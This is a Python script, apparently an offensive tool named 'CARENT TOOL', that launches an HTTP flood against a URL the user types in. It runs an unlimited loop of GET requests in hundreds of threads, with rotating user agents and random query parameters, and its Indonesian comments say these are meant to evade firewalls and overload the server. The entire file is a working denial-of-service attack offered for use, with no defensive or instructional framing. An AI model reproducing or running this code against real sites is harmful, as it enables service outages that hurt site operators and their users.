import os, sys, threading, requests, random, time
from colorama import Fore, Style

def clear(): os.system('clear')

def banner():
    print(f"""{Fore.RED}
    ██████╗ █████╗ ██████╗ ███████╗███╗   ██╗████████╗
    ██╔════╝██╔══██╗██╔══██╗██╔════╝████╗  ██║╚══██╔══╝
    ██║     ███████║██████╔╝█████╗  ██╔██╗ ██║   ██║   
    ██║     ██╔══██║██╔══██╗██╔════╝██║╚██╗██║   ██║   
    ╚██████╗██║  ██║██║  ██║███████╗██║ ╚████║   ██║   
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
    {Fore.YELLOW}          [ CARENT TOOL | v.3.6.4 ]
    {Fore.WHITE}       Created by neuro707 | BYPASS MODE
    """)

def brutal_flood(target, threads):
    # User agents lebih bervariasi untuk bypass firewall
    ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko)"
    ]
    def attack():
        while True:
            try:
                h = {'User-Agent': random.choice(ua), 'Cache-Control': 'no-cache', 'Accept-Encoding': 'gzip'}
                # Mengirim request dengan parameter random untuk memaksa server bekerja lebih berat
                requests.get(target, headers=h, params={'bypass': random._urandom(16)}, timeout=5)
                print(f"{Fore.GREEN}[+] CARENT -> BYPASSING {target} | ATTACK SUCCESS")
            except:
                print(f"{Fore.RED}[!] CONNECTION TIMEOUT - TARGET STRUGGLING")
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

clear()
banner()
target_url = input(f"{Fore.CYAN}TARGET URL: ")
thread_num = int(input("THREADS (Rekomendasi 500): "))
print(f"\n{Fore.YELLOW}[!] MENGAKTIFKAN SERANGAN 7-LAPIS...")
time.sleep(2)
brutal_flood(target_url, thread_num)

while True: time.sleep(1)
